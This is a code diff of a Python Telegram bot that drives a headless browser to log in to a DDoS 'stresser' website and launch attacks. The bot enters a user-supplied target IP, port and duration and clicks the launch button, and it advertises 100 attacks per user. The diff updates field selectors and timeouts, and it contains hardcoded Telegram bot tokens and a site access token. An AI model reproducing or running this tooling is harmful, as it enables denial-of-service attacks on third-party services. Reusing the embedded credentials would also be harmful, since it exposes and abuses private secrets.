@@ -4,17 +4,16 @@ import logging
 import threading
 import time
 import asyncio
-import glob
 from datetime import datetime
 from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
 from playwright.async_api import async_playwright
 
 # ==================== CONFIG ====================
-logging.basicConfig(format='%(astime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-BOT_TOKEN = "8521144614:AAEMAgYMWzljYmC_Cjw-258KEO-G92G2B3s"
+BOT_TOKEN = "8521144614:AAHqwJZ5mLRKXQWAuY1I4uyds6aURQuZfGo"
 WEBSITE_URL = "https://satellitestress.st/attack"
 LOGIN_URL = "https://satellitestress.st/login"
 WEBSITE_TOKEN = "622de40ac2335a06b834fad06a24c42dcfdc7423b93d35a5add017c08c10db37"
@@ -35,51 +34,18 @@ def save_attacks(data):
 
 attacks = load_attacks()
 
-# ==================== PLAYWRIGHT SETUP ====================
-def get_playwright_chromium_path():
-    """Find Playwright's installed Chromium path"""
-    cache_dir = os.path.expanduser("~/.cache/ms-playwright")
-    chromium_folders = glob.glob(f"{cache_dir}/chromium-*")
-    
-    if chromium_folders:
-        # Linux
-        linux_path = os.path.join(chromium_folders[0], "chrome-linux", "chrome")
-        if os.path.exists(linux_path):
-            return linux_path
-        
-        # Windows
-        win_path = os.path.join(chromium_folders[0], "chrome-win", "chrome.exe")
-        if os.path.exists(win_path):
-            return win_path
-    
-    return None
-
 # ==================== PLAYWRIGHT ATTACK FUNCTION ====================
 async def launch_attack_playwright(ip, port, duration):
     try:
         async with async_playwright() as p:
-            # Get Chromium path
-            chromium_path = get_playwright_chromium_path()
-            
             # Launch browser
-            if chromium_path:
-                browser = await p.chromium.launch(
-                    executablePath=chromium_path,
-                    headless=True
-                )
-            else:
-                browser = await p.chromium.launch(headless=True)
-            
-            context = await browser.new_context(
-                viewport={'width': 1920, 'height': 1080}
-            )
+            browser = await p.chromium.launch(headless=True)
+            context = await browser.new_context(viewport={'width': 1280, 'height': 720})
             page = await context.new_page()
             
             # === LOGIN ===
             print("🔑 Logging in...")
             await page.goto(LOGIN_URL, wait_until='networkidle')
-            
-            # Wait for token field
             await page.wait_for_selector('input[name="token"]', timeout=10000)
             await page.fill('input[name="token"]', WEBSITE_TOKEN)
             
@@ -88,7 +54,6 @@ async def launch_attack_playwright(ip, port, duration):
             if captcha:
                 return False, "CAPTCHA_REQUIRED"
             
-            # Click login and wait
             await page.click('button:has-text("Login")')
             await page.wait_for_timeout(3000)
             
@@ -97,96 +62,79 @@ async def launch_attack_playwright(ip, port, duration):
             await page.goto(WEBSITE_URL, wait_until='networkidle')
             await page.wait_for_timeout(3000)
             
-            # === DEBUG: Save screenshot ===
-            await page.screenshot(path='attack_page.png')
-            print("📸 Screenshot saved: attack_page.png")
+            # === FIND INPUT FIELDS - EXACT SELECTORS ===
+            print("🔍 Finding input fields...")
             
-            # === FIND INPUT FIELDS ===
-            # Wait for inputs to be present
-            await page.wait_for_selector('input[type="text"]', timeout=10000)
-            inputs = await page.query_selector_all('input[type="text"]')
-            print(f"🔍 Found {len(inputs)} text input fields")
+            # IP Field - using placeholder
+            ip_field = await page.query_selector('input[placeholder="104.29.138.132"]')
+            if not ip_field:
+                # Fallback: first text input
+                inputs = await page.query_selector_all('input[type="text"]')
+                if len(inputs) >= 1:
+                    ip_field = inputs[0]
             
-            # Filter out hidden inputs
-            visible_inputs = []
-            for inp in inputs:
-                is_hidden = await inp.get_attribute('type') == 'hidden'
-                if not is_hidden:
-                    visible_inputs.append(inp)
-            
-            print(f"👁️ Visible inputs: {len(visible_inputs)}")
-            
-            if len(visible_inputs) >= 3:
-                # Clear and fill IP (first visible input)
-                await visible_inputs[0].fill('')
-                await visible_inputs[0].fill(ip)
+            if ip_field:
+                await ip_field.fill('')
+                await ip_field.fill(ip)
                 print(f"✅ IP entered: {ip}")
-                
-                # Clear and fill Port (second visible input)
-                await visible_inputs[1].fill('')
-                await visible_inputs[1].fill(str(port))
+            else:
+                return False, "❌ IP field not found"
+            
+            # Port Field - using placeholder or second input
+            port_field = await page.query_selector('input[placeholder="80"]')
+            if not port_field:
+                inputs = await page.query_selector_all('input[type="text"]')
+                if len(inputs) >= 2:
+                    port_field = inputs[1]
+            
+            if port_field:
+                await port_field.fill('')
+                await port_field.fill(str(port))
                 print(f"✅ Port entered: {port}")
-                
-                # Clear and fill Duration (third visible input)
-                await visible_inputs[2].fill('')
-                await visible_inputs[2].fill(str(duration))
+            else:
+                return False, "❌ Port field not found"
+            
+            # Duration Field - using placeholder or third input
+            duration_field = await page.query_selector('input[placeholder="60"]')
+            if not duration_field:
+                inputs = await page.query_selector_all('input[type="text"]')
+                if len(inputs) >= 3:
+                    duration_field = inputs[2]
+            
+            if duration_field:
+                await duration_field.fill('')
+                await duration_field.fill(str(duration))
                 print(f"✅ Duration entered: {duration}")
             else:
-                return False, f"❌ Sirf {len(visible_inputs)} visible inputs mile"
+                return False, "❌ Duration field not found"
             
-            # === FIND LAUNCH BUTTON ===
-            await page.wait_for_timeout(1000)
+            # === LAUNCH BUTTON - EXACT SELECTOR ===
+            print("🔍 Finding launch button...")
             
-            # Try multiple button selectors
-            button_selectors = [
-                'button:has-text("Launch")',
-                'button:has-text("Attack")',
-                'button[type="submit"]',
-                'button.bg-cyan-500',
-                'button.w-full'
-            ]
-            
-            launch_btn = None
-            for selector in button_selectors:
-                try:
-                    btn = await page.query_selector(selector)
-                    if btn:
-                        launch_btn = btn
-                        print(f"✅ Button found with: {selector}")
-                        break
-                except:
-                    continue
+            # Try exact button selector from inspect
+            launch_btn = await page.query_selector('button.w-full.bg-cyan-500')
             
             if not launch_btn:
-                # Try to find any button
-                all_buttons = await page.query_selector_all('button')
-                print(f"🔍 Found {len(all_buttons)} buttons total")
-                
-                if all_buttons:
-                    # Usually the last button is the launch button
-                    launch_btn = all_buttons[-1]
-                    print("✅ Using last button as launch button")
-                else:
-                    return False, "❌ Launch button nahi mila"
+                # Fallback: look for button with Launch text
+                buttons = await page.query_selector_all('button')
+                for btn in buttons:
+                    text = await btn.text_content()
+                    if text and "Launch" in text:
+                        launch_btn = btn
+                        break
             
-            # Click launch button
-            await launch_btn.click()
-            print("✅ Launch button clicked")
+            if launch_btn:
+                await launch_btn.click()
+                print("✅ Launch button clicked")
+            else:
+                return False, "❌ Launch button not found"
             
             # Wait for attack to register
             await page.wait_for_timeout(5000)
             
-            # === VERIFY ATTACK STARTED ===
-            # Check for success indicators
-            page_content = await page.content()
-            if "attack started" in page_content.lower() or "launching" in page_content.lower():
-                print("✅ Attack confirmed started")
-            else:
-                print("⚠️ Could not verify attack start, but continuing...")
-            
-            # Take final screenshot
+            # Take screenshot to verify
             await page.screenshot(path='attack_result.png')
-            print("📸 Final screenshot: attack_result.png")
+            print("📸 Screenshot saved: attack_result.png")
             
             await browser.close()
             return True, "SUCCESS"
@@ -319,7 +267,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     launch_attack_playwright(ip, port, duration),
                     loop
                 )
-                success, result = future.result(timeout=60)
+                success, result = future.result(timeout=120)
                 
                 attacks["current"] = None
                 
@@ -382,7 +330,7 @@ def main():
     print("🔥 PLAYWRIGHT ATTACK BOT STARTED")
     print("="*50)
     print(f"👤 Everyone gets 100 attacks")
-    print(f"📁 Check attack_page.png for debugging")
+    print(f"📁 Check attack_result.png for verification")
     print("="*50)
     
     app.run_polling()
